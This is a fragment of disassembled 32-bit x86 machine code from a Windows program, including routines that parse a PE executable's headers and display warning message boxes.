  4017f5:	89 54 24 08          	mov    %edx,0x8(%esp)
  4017f9:	e8 72 06 00 00       	call   0x401e70
  4017fe:	89 34 24             	mov    %esi,(%esp)
  401801:	83 c7 12             	add    $0x12,%edi
  401804:	31 f6                	xor    %esi,%esi
  401806:	e8 8d 90 00 00       	call   0x40a898
  40180b:	89 7c 24 04          	mov    %edi,0x4(%esp)
  40180f:	c7 04 24 ed c0 40 00 	movl   $0x40c0ed,(%esp)
  401816:	e8 55 06 00 00       	call   0x401e70
  40181b:	e9 a7 fe ff ff       	jmp    0x4016c7
  401820:	8b 54 24 40          	mov    0x40(%esp),%edx
  401824:	89 44 24 04          	mov    %eax,0x4(%esp)
  401828:	c7 04 24 99 c0 40 00 	movl   $0x40c099,(%esp)
  40182f:	89 54 24 08          	mov    %edx,0x8(%esp)
  401833:	e8 38 06 00 00       	call   0x401e70
  401838:	eb c4                	jmp    0x4017fe
  40183a:	c7 04 24 6c c0 40 00 	movl   $0x40c06c,(%esp)
  401841:	e8 2a 06 00 00       	call   0x401e70
  401846:	eb b6                	jmp    0x4017fe
  401848:	90                   	nop
  401849:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401850:	55                   	push   %ebp
  401851:	57                   	push   %edi
  401852:	56                   	push   %esi
  401853:	53                   	push   %ebx
  401854:	83 ec 1c             	sub    $0x1c,%esp
  401857:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  40185b:	8b 74 24 34          	mov    0x34(%esp),%esi
  40185f:	89 1c 24             	mov    %ebx,(%esp)
  401862:	89 74 24 04          	mov    %esi,0x4(%esp)
  401866:	e8 a5 fd ff ff       	call   0x401610
  40186b:	89 1c 24             	mov    %ebx,(%esp)
  40186e:	89 c7                	mov    %eax,%edi
  401870:	e8 2b 2f 00 00       	call   0x4047a0
  401875:	83 f8 ff             	cmp    $0xffffffff,%eax
  401878:	74 5f                	je     0x4018d9
  40187a:	8d 6e 12             	lea    0x12(%esi),%ebp
  40187d:	81 c3 68 20 00 00    	add    $0x2068,%ebx
  401883:	89 1c 24             	mov    %ebx,(%esp)
  401886:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  40188a:	e8 41 31 00 00       	call   0x4049d0
  40188f:	89 c3                	mov    %eax,%ebx
  401891:	8b 46 0c             	mov    0xc(%esi),%eax
  401894:	89 04 24             	mov    %eax,(%esp)
  401897:	ff 15 d4 f3 41 00    	call   *0x41f3d4
  40189d:	83 ec 04             	sub    $0x4,%esp
  4018a0:	85 db                	test   %ebx,%ebx
  4018a2:	89 c6                	mov    %eax,%esi
  4018a4:	74 52                	je     0x4018f8
  4018a6:	89 5c 24 0c          	mov    %ebx,0xc(%esp)
  4018aa:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  4018b1:	00 
  4018b2:	89 44 24 04          	mov    %eax,0x4(%esp)
  4018b6:	89 3c 24             	mov    %edi,(%esp)
  4018b9:	e8 e2 8f 00 00       	call   0x40a8a0
  4018be:	83 f8 01             	cmp    $0x1,%eax
  4018c1:	74 04                	je     0x4018c7
  4018c3:	85 f6                	test   %esi,%esi
  4018c5:	75 1a                	jne    0x4018e1
  4018c7:	89 1c 24             	mov    %ebx,(%esp)
  4018ca:	e8 c1 8f 00 00       	call   0x40a890
  4018cf:	89 3c 24             	mov    %edi,(%esp)
  4018d2:	e8 c1 8f 00 00       	call   0x40a898
  4018d7:	31 c0                	xor    %eax,%eax
  4018d9:	83 c4 1c             	add    $0x1c,%esp
  4018dc:	5b                   	pop    %ebx
  4018dd:	5e                   	pop    %esi
  4018de:	5f                   	pop    %edi
  4018df:	5d                   	pop    %ebp
  4018e0:	c3                   	ret
  4018e1:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4018e5:	c7 04 24 24 c1 40 00 	movl   $0x40c124,(%esp)
  4018ec:	e8 1f 05 00 00       	call   0x401e10
  4018f1:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4018f6:	eb e1                	jmp    0x4018d9
  4018f8:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4018fc:	c7 04 24 05 c1 40 00 	movl   $0x40c105,(%esp)
  401903:	e8 08 05 00 00       	call   0x401e10
  401908:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40190d:	eb ca                	jmp    0x4018d9
  40190f:	90                   	nop
  401910:	57                   	push   %edi
  401911:	56                   	push   %esi
  401912:	53                   	push   %ebx
  401913:	83 ec 20             	sub    $0x20,%esp
  401916:	8b 5c 24 30          	mov    0x30(%esp),%ebx
  40191a:	8b 03                	mov    (%ebx),%eax
  40191c:	85 c0                	test   %eax,%eax
  40191e:	0f 84 7c 02 00 00    	je     0x401ba0
  401924:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  40192b:	00 
  40192c:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401933:	00 
  401934:	89 04 24             	mov    %eax,(%esp)
  401937:	e8 44 8f 00 00       	call   0x40a880
  40193c:	8b 03                	mov    (%ebx),%eax
  40193e:	89 04 24             	mov    %eax,(%esp)
  401941:	e8 62 8f 00 00       	call   0x40a8a8
  401946:	89 c2                	mov    %eax,%edx
  401948:	89 c6                	mov    %eax,%esi
  40194a:	89 d8                	mov    %ebx,%eax
  40194c:	e8 ff fb ff ff       	call   0x401550
  401951:	85 c0                	test   %eax,%eax
  401953:	0f 88 d7 00 00 00    	js     0x401a30
  401959:	8b 43 18             	mov    0x18(%ebx),%eax
  40195c:	8b 3d d4 f3 41 00    	mov    0x41f3d4,%edi
  401962:	c7 83 6c 40 00 00 00 	movl   $0x0,0x406c(%ebx)
  401969:	00 00 00 
  40196c:	89 04 24             	mov    %eax,(%esp)
  40196f:	ff d7                	call   *%edi
  401971:	29 c6                	sub    %eax,%esi
  401973:	8b 43 1c             	mov    0x1c(%ebx),%eax
  401976:	83 ec 04             	sub    $0x4,%esp
  401979:	89 73 04             	mov    %esi,0x4(%ebx)
  40197c:	89 04 24             	mov    %eax,(%esp)
  40197f:	ff d7                	call   *%edi
  401981:	83 ec 04             	sub    $0x4,%esp
  401984:	01 f0                	add    %esi,%eax
  401986:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40198d:	00 
  40198e:	89 44 24 04          	mov    %eax,0x4(%esp)
  401992:	8b 03                	mov    (%ebx),%eax
  401994:	89 04 24             	mov    %eax,(%esp)
  401997:	e8 e4 8e 00 00       	call   0x40a880
  40199c:	8b 43 20             	mov    0x20(%ebx),%eax
  40199f:	89 04 24             	mov    %eax,(%esp)
  4019a2:	ff d7                	call   *%edi
  4019a4:	83 ec 04             	sub    $0x4,%esp
  4019a7:	89 04 24             	mov    %eax,(%esp)
  4019aa:	e8 a1 8e 00 00       	call   0x40a850
  4019af:	85 c0                	test   %eax,%eax
  4019b1:	89 43 08             	mov    %eax,0x8(%ebx)
  4019b4:	0f 84 46 02 00 00    	je     0x401c00
  4019ba:	8b 43 20             	mov    0x20(%ebx),%eax
  4019bd:	8b 33                	mov    (%ebx),%esi
  4019bf:	89 04 24             	mov    %eax,(%esp)
  4019c2:	ff d7                	call   *%edi
  4019c4:	83 ec 04             	sub    $0x4,%esp
  4019c7:	89 74 24 0c          	mov    %esi,0xc(%esp)
  4019cb:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  4019d2:	00 
  4019d3:	89 44 24 04          	mov    %eax,0x4(%esp)
  4019d7:	8b 43 08             	mov    0x8(%ebx),%eax
  4019da:	89 04 24             	mov    %eax,(%esp)
  4019dd:	e8 a6 8e 00 00       	call   0x40a888
  4019e2:	85 c0                	test   %eax,%eax
  4019e4:	0f 84 d6 01 00 00    	je     0x401bc0
  4019ea:	8b 73 08             	mov    0x8(%ebx),%esi
  4019ed:	8b 43 20             	mov    0x20(%ebx),%eax
  4019f0:	89 04 24             	mov    %eax,(%esp)
  4019f3:	ff d7                	call   *%edi
  4019f5:	01 f0                	add    %esi,%eax
  4019f7:	83 ec 04             	sub    $0x4,%esp
  4019fa:	89 43 0c             	mov    %eax,0xc(%ebx)
  4019fd:	8b 03                	mov    (%ebx),%eax
  4019ff:	89 04 24             	mov    %eax,(%esp)
  401a02:	e8 a9 8e 00 00       	call   0x40a8b0
  401a07:	85 c0                	test   %eax,%eax
  401a09:	89 c6                	mov    %eax,%esi
  401a0b:	0f 85 cf 01 00 00    	jne    0x401be0
  401a11:	8b 03                	mov    (%ebx),%eax
  401a13:	85 c0                	test   %eax,%eax
  401a15:	74 0e                	je     0x401a25
  401a17:	89 04 24             	mov    %eax,(%esp)
  401a1a:	e8 71 8e 00 00       	call   0x40a890
  401a1f:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  401a25:	83 c4 20             	add    $0x20,%esp
  401a28:	89 f0                	mov    %esi,%eax
  401a2a:	5b                   	pop    %ebx
  401a2b:	5e                   	pop    %esi
  401a2c:	5f                   	pop    %edi
  401a2d:	c3                   	ret
  401a2e:	66 90                	xchg   %ax,%ax
  401a30:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401a37:	00 
  401a38:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401a3f:	00 
  401a40:	8d 74 24 1a          	lea    0x1a(%esp),%esi
  401a44:	8b 03                	mov    (%ebx),%eax
  401a46:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  401a4d:	00 
  401a4e:	89 04 24             	mov    %eax,(%esp)
  401a51:	e8 2a 8e 00 00       	call   0x40a880
  401a56:	8b 03                	mov    (%ebx),%eax
  401a58:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  401a5f:	00 
  401a60:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
  401a67:	00 
  401a68:	89 34 24             	mov    %esi,(%esp)
  401a6b:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401a6f:	e8 14 8e 00 00       	call   0x40a888
  401a74:	80 7c 24 1a 4d       	cmpb   $0x4d,0x1a(%esp)
  401a79:	0f 85 09 01 00 00    	jne    0x401b88
  401a7f:	80 7c 24 1b 5a       	cmpb   $0x5a,0x1b(%esp)
  401a84:	0f 85 fe 00 00 00    	jne    0x401b88
  401a8a:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401a91:	00 
  401a92:	c7 44 24 04 3c 00 00 	movl   $0x3c,0x4(%esp)
  401a99:	00 
  401a9a:	8d 7c 24 1c          	lea    0x1c(%esp),%edi
  401a9e:	8b 03                	mov    (%ebx),%eax
  401aa0:	89 04 24             	mov    %eax,(%esp)
  401aa3:	e8 d8 8d 00 00       	call   0x40a880
  401aa8:	8b 03                	mov    (%ebx),%eax
  401aaa:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  401ab1:	00 
  401ab2:	c7 44 24 04 04 00 00 	movl   $0x4,0x4(%esp)
  401ab9:	00 
  401aba:	89 3c 24             	mov    %edi,(%esp)
  401abd:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401ac1:	e8 c2 8d 00 00       	call   0x40a888
  401ac6:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401aca:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401ad1:	00 
  401ad2:	83 c0 18             	add    $0x18,%eax
  401ad5:	89 44 24 04          	mov    %eax,0x4(%esp)
  401ad9:	8b 03                	mov    (%ebx),%eax
  401adb:	89 04 24             	mov    %eax,(%esp)
  401ade:	e8 9d 8d 00 00       	call   0x40a880
  401ae3:	8b 03                	mov    (%ebx),%eax
  401ae5:	89 34 24             	mov    %esi,(%esp)
  401ae8:	be ff ff ff ff       	mov    $0xffffffff,%esi
  401aed:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  401af4:	00 
  401af5:	c7 44 24 04 02 00 00 	movl   $0x2,0x4(%esp)
  401afc:	00 
  401afd:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401b01:	e8 82 8d 00 00       	call   0x40a888
  401b06:	80 7c 24 1a 0b       	cmpb   $0xb,0x1a(%esp)
  401b0b:	0f 85 14 ff ff ff    	jne    0x401a25
  401b11:	0f b6 44 24 1b       	movzbl 0x1b(%esp),%eax
  401b16:	3c 01                	cmp    $0x1,%al
  401b18:	0f 84 d8 00 00 00    	je     0x401bf6
  401b1e:	3c 02                	cmp    $0x2,%al
  401b20:	75 66                	jne    0x401b88
  401b22:	b8 a8 00 00 00       	mov    $0xa8,%eax
  401b27:	03 44 24 1c          	add    0x1c(%esp),%eax
  401b2b:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401b32:	00 
  401b33:	89 44 24 04          	mov    %eax,0x4(%esp)
  401b37:	8b 03                	mov    (%ebx),%eax
  401b39:	89 04 24             	mov    %eax,(%esp)
  401b3c:	e8 3f 8d 00 00       	call   0x40a880
  401b41:	8b 03                	mov    (%ebx),%eax
  401b43:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  401b4a:	00 
  401b4b:	c7 44 24 04 04 00 00 	movl   $0x4,0x4(%esp)
  401b52:	00 
  401b53:	89 3c 24             	mov    %edi,(%esp)
  401b56:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401b5a:	e8 29 8d 00 00       	call   0x40a888
  401b5f:	8b 74 24 1c          	mov    0x1c(%esp),%esi
  401b63:	83 fe 00             	cmp    $0x0,%esi
  401b66:	74 20                	je     0x401b88
  401b68:	7e 1e                	jle    0x401b88
  401b6a:	8d 7e f8             	lea    -0x8(%esi),%edi
  401b6d:	8d 76 00             	lea    0x0(%esi),%esi
  401b70:	89 f2                	mov    %esi,%edx
  401b72:	89 d8                	mov    %ebx,%eax
  401b74:	e8 d7 f9 ff ff       	call   0x401550
  401b79:	85 c0                	test   %eax,%eax
  401b7b:	0f 89 d8 fd ff ff    	jns    0x401959
  401b81:	83 ee 01             	sub    $0x1,%esi
  401b84:	39 fe                	cmp    %edi,%esi
  401b86:	75 e8                	jne    0x401b70
  401b88:	83 c4 20             	add    $0x20,%esp
  401b8b:	be ff ff ff ff       	mov    $0xffffffff,%esi
  401b90:	89 f0                	mov    %esi,%eax
  401b92:	5b                   	pop    %ebx
  401b93:	5e                   	pop    %esi
  401b94:	5f                   	pop    %edi
  401b95:	c3                   	ret
  401b96:	8d 76 00             	lea    0x0(%esi),%esi
  401b99:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401ba0:	8d 43 68             	lea    0x68(%ebx),%eax
  401ba3:	c7 44 24 04 2c c0 40 	movl   $0x40c02c,0x4(%esp)
  401baa:	00 
  401bab:	89 04 24             	mov    %eax,(%esp)
  401bae:	e8 bd 12 00 00       	call   0x402e70
  401bb3:	85 c0                	test   %eax,%eax
  401bb5:	89 03                	mov    %eax,(%ebx)
  401bb7:	0f 85 67 fd ff ff    	jne    0x401924
  401bbd:	eb c9                	jmp    0x401b88
  401bbf:	90                   	nop
  401bc0:	c7 04 24 6b c1 40 00 	movl   $0x40c16b,(%esp)
  401bc7:	be ff ff ff ff       	mov    $0xffffffff,%esi
  401bcc:	e8 3f 02 00 00       	call   0x401e10
  401bd1:	e9 4f fe ff ff       	jmp    0x401a25
  401bd6:	8d 76 00             	lea    0x0(%esi),%esi
  401bd9:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401be0:	c7 04 24 85 c1 40 00 	movl   $0x40c185,(%esp)
  401be7:	be ff ff ff ff       	mov    $0xffffffff,%esi
  401bec:	e8 1f 02 00 00       	call   0x401e10
  401bf1:	e9 2f fe ff ff       	jmp    0x401a25
  401bf6:	b8 98 00 00 00       	mov    $0x98,%eax
  401bfb:	e9 27 ff ff ff       	jmp    0x401b27
  401c00:	c7 04 24 48 c1 40 00 	movl   $0x40c148,(%esp)
  401c07:	be ff ff ff ff       	mov    $0xffffffff,%esi
  401c0c:	e8 ff 01 00 00       	call   0x401e10
  401c11:	e9 0f fe ff ff       	jmp    0x401a25
  401c16:	8d 76 00             	lea    0x0(%esi),%esi
  401c19:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401c20:	57                   	push   %edi
  401c21:	56                   	push   %esi
  401c22:	53                   	push   %ebx
  401c23:	83 ec 10             	sub    $0x10,%esp
  401c26:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  401c2a:	8b 7c 24 24          	mov    0x24(%esp),%edi
  401c2e:	8d 73 68             	lea    0x68(%ebx),%esi
  401c31:	89 7c 24 04          	mov    %edi,0x4(%esp)
  401c35:	89 34 24             	mov    %esi,(%esp)
  401c38:	e8 7b 8c 00 00       	call   0x40a8b8
  401c3d:	8b 44 24 28          	mov    0x28(%esp),%eax
  401c41:	89 34 24             	mov    %esi,(%esp)
  401c44:	8d b3 68 10 00 00    	lea    0x1068(%ebx),%esi
  401c4a:	81 c3 68 30 00 00    	add    $0x3068,%ebx
  401c50:	89 44 24 04          	mov    %eax,0x4(%esp)
  401c54:	e8 67 8c 00 00       	call   0x40a8c0
  401c59:	89 7c 24 04          	mov    %edi,0x4(%esp)
  401c5d:	89 34 24             	mov    %esi,(%esp)
  401c60:	e8 53 8c 00 00       	call   0x40a8b8
  401c65:	c7 83 00 10 00 00 00 	movl   $0x0,0x1000(%ebx)
  401c6c:	00 00 00 
  401c6f:	89 74 24 04          	mov    %esi,0x4(%esp)
  401c73:	89 1c 24             	mov    %ebx,(%esp)
  401c76:	e8 3d 8c 00 00       	call   0x40a8b8
  401c7b:	83 c4 10             	add    $0x10,%esp
  401c7e:	31 c0                	xor    %eax,%eax
  401c80:	5b                   	pop    %ebx
  401c81:	5e                   	pop    %esi
  401c82:	5f                   	pop    %edi
  401c83:	c3                   	ret
  401c84:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  401c8a:	8d bf 00 00 00 00    	lea    0x0(%edi),%edi
  401c90:	53                   	push   %ebx
  401c91:	83 ec 18             	sub    $0x18,%esp
  401c94:	8b 44 24 28          	mov    0x28(%esp),%eax
  401c98:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  401c9c:	89 44 24 08          	mov    %eax,0x8(%esp)
  401ca0:	8b 44 24 24          	mov    0x24(%esp),%eax
  401ca4:	89 1c 24             	mov    %ebx,(%esp)
  401ca7:	89 44 24 04          	mov    %eax,0x4(%esp)
  401cab:	e8 70 ff ff ff       	call   0x401c20
  401cb0:	85 c0                	test   %eax,%eax
  401cb2:	75 20                	jne    0x401cd4
  401cb4:	89 1c 24             	mov    %ebx,(%esp)
  401cb7:	e8 54 fc ff ff       	call   0x401910
  401cbc:	85 c0                	test   %eax,%eax
  401cbe:	74 19                	je     0x401cd9
  401cc0:	8b 03                	mov    (%ebx),%eax
  401cc2:	85 c0                	test   %eax,%eax
  401cc4:	74 0e                	je     0x401cd4
  401cc6:	89 04 24             	mov    %eax,(%esp)
  401cc9:	e8 c2 8b 00 00       	call   0x40a890
  401cce:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  401cd4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  401cd9:	83 c4 18             	add    $0x18,%esp
  401cdc:	5b                   	pop    %ebx
  401cdd:	c3                   	ret
  401cde:	66 90                	xchg   %ax,%ax
  401ce0:	8b 44 24 04          	mov    0x4(%esp),%eax
  401ce4:	8b 40 08             	mov    0x8(%eax),%eax
  401ce7:	c3                   	ret
  401ce8:	90                   	nop
  401ce9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401cf0:	53                   	push   %ebx
  401cf1:	83 ec 18             	sub    $0x18,%esp
  401cf4:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  401cf8:	8b 03                	mov    (%ebx),%eax
  401cfa:	89 04 24             	mov    %eax,(%esp)
  401cfd:	ff 15 d4 f3 41 00    	call   *0x41f3d4
  401d03:	83 ec 04             	sub    $0x4,%esp
  401d06:	01 d8                	add    %ebx,%eax
  401d08:	8b 54 24 20          	mov    0x20(%esp),%edx
  401d0c:	3b 42 0c             	cmp    0xc(%edx),%eax
  401d0f:	ba 00 00 00 00       	mov    $0x0,%edx
  401d14:	0f 43 c2             	cmovae %edx,%eax
  401d17:	83 c4 18             	add    $0x18,%esp
  401d1a:	5b                   	pop    %ebx
  401d1b:	c3                   	ret
  401d1c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401d20:	83 ec 1c             	sub    $0x1c,%esp
  401d23:	8b 44 24 20          	mov    0x20(%esp),%eax
  401d27:	8b 40 24             	mov    0x24(%eax),%eax
  401d2a:	89 04 24             	mov    %eax,(%esp)
  401d2d:	ff 15 d4 f3 41 00    	call   *0x41f3d4
  401d33:	83 ec 04             	sub    $0x4,%esp
  401d36:	83 c4 1c             	add    $0x1c,%esp
  401d39:	c3                   	ret
  401d3a:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  401d40:	53                   	push   %ebx
  401d41:	83 ec 18             	sub    $0x18,%esp
  401d44:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  401d48:	85 db                	test   %ebx,%ebx
  401d4a:	74 34                	je     0x401d80
  401d4c:	8b 43 08             	mov    0x8(%ebx),%eax
  401d4f:	85 c0                	test   %eax,%eax
  401d51:	74 08                	je     0x401d5b
  401d53:	89 04 24             	mov    %eax,(%esp)
  401d56:	e8 3d 8b 00 00       	call   0x40a898
  401d5b:	8b 03                	mov    (%ebx),%eax
  401d5d:	85 c0                	test   %eax,%eax
  401d5f:	74 08                	je     0x401d69
  401d61:	89 04 24             	mov    %eax,(%esp)
  401d64:	e8 27 8b 00 00       	call   0x40a890
  401d69:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  401d6d:	83 c4 18             	add    $0x18,%esp
  401d70:	5b                   	pop    %ebx
  401d71:	e9 22 8b 00 00       	jmp    0x40a898
  401d76:	8d 76 00             	lea    0x0(%esi),%esi
  401d79:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401d80:	83 c4 18             	add    $0x18,%esp
  401d83:	5b                   	pop    %ebx
  401d84:	c3                   	ret
  401d85:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401d89:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  401d90:	55                   	push   %ebp
  401d91:	57                   	push   %edi
  401d92:	56                   	push   %esi
  401d93:	53                   	push   %ebx
  401d94:	83 ec 1c             	sub    $0x1c,%esp
  401d97:	8b 74 24 30          	mov    0x30(%esp),%esi
  401d9b:	8b 6c 24 34          	mov    0x34(%esp),%ebp
  401d9f:	8b 5e 08             	mov    0x8(%esi),%ebx
  401da2:	89 2c 24             	mov    %ebp,(%esp)
  401da5:	e8 1e 8b 00 00       	call   0x40a8c8
  401daa:	3b 5e 0c             	cmp    0xc(%esi),%ebx
  401dad:	89 c7                	mov    %eax,%edi
  401daf:	73 30                	jae    0x401de1
  401db1:	80 7b 11 6f          	cmpb   $0x6f,0x11(%ebx)
  401db5:	75 17                	jne    0x401dce
  401db7:	8d 43 12             	lea    0x12(%ebx),%eax
  401dba:	89 7c 24 08          	mov    %edi,0x8(%esp)
  401dbe:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  401dc2:	89 04 24             	mov    %eax,(%esp)
  401dc5:	e8 06 8b 00 00       	call   0x40a8d0
  401dca:	85 c0                	test   %eax,%eax
  401dcc:	74 22                	je     0x401df0
  401dce:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  401dd2:	89 34 24             	mov    %esi,(%esp)
  401dd5:	e8 f6 f7 ff ff       	call   0x4015d0
  401dda:	39 46 0c             	cmp    %eax,0xc(%esi)
  401ddd:	89 c3                	mov    %eax,%ebx
  401ddf:	77 d0                	ja     0x401db1
  401de1:	83 c4 1c             	add    $0x1c,%esp
  401de4:	31 c0                	xor    %eax,%eax
  401de6:	5b                   	pop    %ebx
  401de7:	5e                   	pop    %esi
  401de8:	5f                   	pop    %edi
  401de9:	5d                   	pop    %ebp
  401dea:	c3                   	ret
  401deb:	90                   	nop
  401dec:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401df0:	80 7c 3b 12 00       	cmpb   $0x0,0x12(%ebx,%edi,1)
  401df5:	8d 54 3b 13          	lea    0x13(%ebx,%edi,1),%edx
  401df9:	8d 44 3b 12          	lea    0x12(%ebx,%edi,1),%eax
  401dfd:	0f 45 c2             	cmovne %edx,%eax
  401e00:	83 c4 1c             	add    $0x1c,%esp
  401e03:	5b                   	pop    %ebx
  401e04:	5e                   	pop    %esi
  401e05:	5f                   	pop    %edi
  401e06:	5d                   	pop    %ebp
  401e07:	c3                   	ret
  401e08:	90                   	nop
  401e09:	90                   	nop
  401e0a:	90                   	nop
  401e0b:	90                   	nop
  401e0c:	90                   	nop
  401e0d:	90                   	nop
  401e0e:	90                   	nop
  401e0f:	90                   	nop
  401e10:	53                   	push   %ebx
  401e11:	81 ec 18 04 00 00    	sub    $0x418,%esp
  401e17:	8d 84 24 24 04 00 00 	lea    0x424(%esp),%eax
  401e1e:	8d 5c 24 10          	lea    0x10(%esp),%ebx
  401e22:	c7 44 24 04 00 04 00 	movl   $0x400,0x4(%esp)
  401e29:	00 
  401e2a:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401e2e:	8b 84 24 20 04 00 00 	mov    0x420(%esp),%eax
  401e35:	89 1c 24             	mov    %ebx,(%esp)
  401e38:	89 44 24 08          	mov    %eax,0x8(%esp)
  401e3c:	e8 cf 87 00 00       	call   0x40a610
  401e41:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  401e45:	c7 44 24 0c 30 00 00 	movl   $0x30,0xc(%esp)
  401e4c:	00 
  401e4d:	c7 44 24 08 94 c1 40 	movl   $0x40c194,0x8(%esp)
  401e54:	00 
  401e55:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401e5c:	ff 15 cc f3 41 00    	call   *0x41f3cc
  401e62:	83 ec 10             	sub    $0x10,%esp
  401e65:	81 c4 18 04 00 00    	add    $0x418,%esp
  401e6b:	5b                   	pop    %ebx
  401e6c:	c3                   	ret
  401e6d:	8d 76 00             	lea    0x0(%esi),%esi
  401e70:	53                   	push   %ebx
  401e71:	81 ec 18 04 00 00    	sub    $0x418,%esp
  401e77:	8d 84 24 24 04 00 00 	lea    0x424(%esp),%eax
  401e7e:	8d 5c 24 10          	lea    0x10(%esp),%ebx
  401e82:	c7 44 24 04 00 04 00 	movl   $0x400,0x4(%esp)
  401e89:	00 
  401e8a:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401e8e:	8b 84 24 20 04 00 00 	mov    0x420(%esp),%eax
  401e95:	89 1c 24             	mov    %ebx,(%esp)
  401e98:	89 44 24 08          	mov    %eax,0x8(%esp)
  401e9c:	e8 6f 87 00 00       	call   0x40a610
  401ea1:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  401ea5:	c7 44 24 0c 30 00 00 	movl   $0x30,0xc(%esp)
  401eac:	00 
  401ead:	c7 44 24 08 a1 c1 40 	movl   $0x40c1a1,0x8(%esp)
  401eb4:	00 
  401eb5:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401ebc:	ff 15 cc f3 41 00    	call   *0x41f3cc
  401ec2:	83 ec 10             	sub    $0x10,%esp
  401ec5:	81 c4 18 04 00 00    	add    $0x418,%esp
  401ecb:	5b                   	pop    %ebx
  401ecc:	c3                   	ret
  401ecd:	8d 76 00             	lea    0x0(%esi),%esi
  401ed0:	83 ec 1c             	sub    $0x1c,%esp
  401ed3:	8d 44 24 24          	lea    0x24(%esp),%eax
  401ed7:	89 44 24 08          	mov    %eax,0x8(%esp)
  401edb:	8b 44 24 20          	mov    0x20(%esp),%eax
  401edf:	89 44 24 04          	mov    %eax,0x4(%esp)
  401ee3:	a1 00 f3 41 00       	mov    0x41f300,%eax
  401ee8:	83 c0 40             	add    $0x40,%eax
  401eeb:	89 04 24             	mov    %eax,(%esp)
  401eee:	e8 e5 89 00 00       	call   0x40a8d8
  401ef3:	83 c4 1c             	add    $0x1c,%esp
  401ef6:	c3                   	ret
  401ef7:	90                   	nop
  401ef8:	90                   	nop
  401ef9:	90                   	nop
  401efa:	90                   	nop
  401efb:	90                   	nop
  401efc:	90                   	nop
  401efd:	90                   	nop
  401efe:	90                   	nop
  401eff:	90                   	nop
  401f00:	53                   	push   %ebx
  401f01:	83 ec 48             	sub    $0x48,%esp
  401f04:	8d 44 24 58          	lea    0x58(%esp),%eax
  401f08:	8b 5c 24 50          	mov    0x50(%esp),%ebx
  401f0c:	c7 44 24 04 00 10 00 	movl   $0x1000,0x4(%esp)
  401f13:	00 
  401f14:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401f18:	8b 44 24 54          	mov    0x54(%esp),%eax
  401f1c:	89 1c 24             	mov    %ebx,(%esp)
  401f1f:	89 44 24 08          	mov    %eax,0x8(%esp)
  401f23:	e8 e8 86 00 00       	call   0x40a610
  401f28:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  401f2c:	89 1c 24             	mov    %ebx,(%esp)
  401f2f:	89 44 24 04          	mov    %eax,0x4(%esp)
  401f33:	e8 e8 86 00 00       	call   0x40a620
  401f38:	83 c4 48             	add    $0x48,%esp
  401f3b:	5b                   	pop    %ebx
  401f3c:	c3                   	ret
  401f3d:	8d 76 00             	lea    0x0(%esi),%esi
  401f40:	55                   	push   %ebp
  401f41:	57                   	push   %edi
  401f42:	56                   	push   %esi
  401f43:	53                   	push   %ebx
  401f44:	50                   	push   %eax
  401f45:	b8 58 50 00 00       	mov    $0x5058,%eax
  401f4a:	e8 91 86 00 00       	call   0x40a5e0
  401f4f:	29 c4                	sub    %eax,%esp
  401f51:	8b 04 04             	mov    (%esp,%eax,1),%eax
  401f54:	8d b4 24 4f 40 00 00 	lea    0x404f(%esp),%esi
